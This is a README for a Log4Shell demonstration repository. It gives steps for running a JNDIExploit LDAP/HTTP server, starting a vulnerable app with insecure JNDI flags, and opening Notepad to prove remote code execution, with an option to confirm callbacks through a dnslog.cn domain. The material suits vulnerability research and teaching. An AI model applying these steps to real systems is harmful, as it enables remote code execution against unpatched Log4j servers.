# Log4jShell

Prequisites:

1. Java
2. Maven
3. IntelliJ/Eclipse

Steps to run application and reproduce the Log4jShell issue:

1. Clone the repo https://github.com/itsMakHere/Log4jShell.git
3. Run the ```JNDIExploit-1.2-SNAPSHOT.jar``` using the ```java -jar JNDIExploitServer/JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1``` to start the local ldap and http server
2. Import/open the project into IntelliJ/Eclipse
4. Set the VM arguments to following values: ```-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j2.debug=true```
5. Run the Application.java file.
6. **Notepad** application will get open which proves that attacker was able to execute arbitrary code on server

### OR

1. Clone the repo https://github.com/itsMakHere/Log4jShell.git
2. Run the ```JNDIExploit-1.2-SNAPSHOT.jar``` using the ```java -jar JNDIExploitServer/JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1``` to start the local ldap and http server
3. Run ```mvn clean install``` command
4. Run ```java -jar -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j2.debug=true target/Log4jShell-1.0-SNAPSHOT-jar-with-dependencies.jar```
5. **Notepad** application will get open which proves that attacker was able to execute arbitrary code on server

**NOTE: You change the server address to point to you server address in ```Application.java``` file.**

### (Optional) Getting your own DNS

For some reason if you are not able to do the above setup then just to demonstrate that log4j library actually makes the call to url passed for logging
to resolve configuration you can follow the below steps:

1. Go to http://www.dnslog.cn/
2. Click on ```Get SubDomain``` button
3. Copy the domain name and paste it into ```Application.java``` by replacing ```127.0.0.1:1389``` with your domain name.
4. Run the application again.
5. You will see the that application tried to hit the pasted url in http://www.dnslog.cn/

For more info head onto this repo: https://github.com/christophetd/log4shell-vulnerable-app